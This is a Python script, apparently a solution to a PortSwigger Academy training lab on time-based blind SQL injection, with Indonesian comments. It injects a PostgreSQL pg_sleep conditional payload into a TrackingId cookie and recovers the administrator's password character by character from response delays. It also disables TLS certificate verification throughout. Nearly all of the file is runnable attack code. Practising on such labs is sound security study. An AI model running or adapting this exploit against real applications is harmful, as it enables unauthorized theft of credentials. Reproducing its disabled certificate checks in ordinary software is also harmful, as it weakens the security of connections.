#!/usr/bin/python3

import sys
import requests
import urllib.parse
import urllib3
from requests.adapters import HTTPAdapter
from urllib3.util.ssl_ import create_urllib3_context

# TAMBAHKAN CLASS INI untuk mengatasi HTTP/2 dan SSL
class ForceHTTP1_1Adapter(HTTPAdapter):
    def init_poolmanager(self, *args, **kwargs):
        kwargs['ssl_context'] = create_urllib3_context()
        kwargs['ssl_context'].set_alpn_protocols(['http/1.1'])
        # TAMBAHKAN: Nonaktifkan check_hostname
        kwargs['ssl_context'].check_hostname = False
        kwargs['ssl_context'].verify_mode = False
        return super().init_poolmanager(*args, **kwargs)

    def proxy_manager_for(self, *args, **kwargs):
        kwargs['ssl_context'] = create_urllib3_context()
        kwargs['ssl_context'].set_alpn_protocols(['http/1.1'])
        # TAMBAHKAN: Nonaktifkan check_hostname
        kwargs['ssl_context'].check_hostname = False
        kwargs['ssl_context'].verify_mode = False
        return super().proxy_manager_for(*args, **kwargs)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Interface ():
    def __init__ (self):
        self.red = '\033[91m'
        self.green = '\033[92m'
        self.white = '\033[37m'
        self.yellow = '\033[93m'
        self.bold = '\033[1m'
        self.end = '\033[0m'

    def header(self):
        print('\n    >> Blind SQL injection with time delays and information retrieval')
        print('    >> by Port Swigger Academy\n')

    def info (self, message):
        print(f"[{self.white}*{self.end}] {message}")

    def warning (self, message):
        print(f"[{self.yellow}!{self.end}] {message}")

    def error (self, message):
        print(f"[{self.red}x{self.end}] {message}")

    def success (self, message):
        print(f"[{self.green}✓{self.end}] {self.bold}{message}{self.end}")

# Instantiate our interface class
global output
output = Interface()
output.header()

proxy = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def sql_password(url):
    # Buat session dengan HTTP/1.1
    session = requests.Session()
    session.mount('https://', ForceHTTP1_1Adapter())
    session.mount('http://', ForceHTTP1_1Adapter())
    # TAMBAHKAN: Nonaktifkan verify di session level
    session.verify = False
    
    password_extracted = ""
    for i in range(1, 21):
        for j in range(32, 126):
            sqli_payload = f"' || (select case when (username='administrator' and ascii(substring(password,{i},1))='{j}') then pg_sleep(10) else pg_sleep(0) end from users)--"
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies = {
                'TrackingId':'axCJsIXQYEDWqcpM' + sqli_payload_encoded, 
                'session': 'KxNmMEjDcRy3DBGp8qNgZQYcfoOUly6W'
            }
            # HAPUS verify=False dari sini karena sudah di session
            response = session.get(url, cookies=cookies, proxies=proxy)
            if int(response.elapsed.total_seconds()) > 9:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
            else:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()

def main():
    if len(sys.argv) !=2:
        output.info("Usage: %s <url>" % sys.argv[0])
        output.info("Example: %s <url>" % sys.argv[0])
        sys.exit(-1)
    
    url = sys.argv[1]
    output.info("Retrieving administrator's password...")
    sql_password(url)

if __name__ == "__main__":
    main()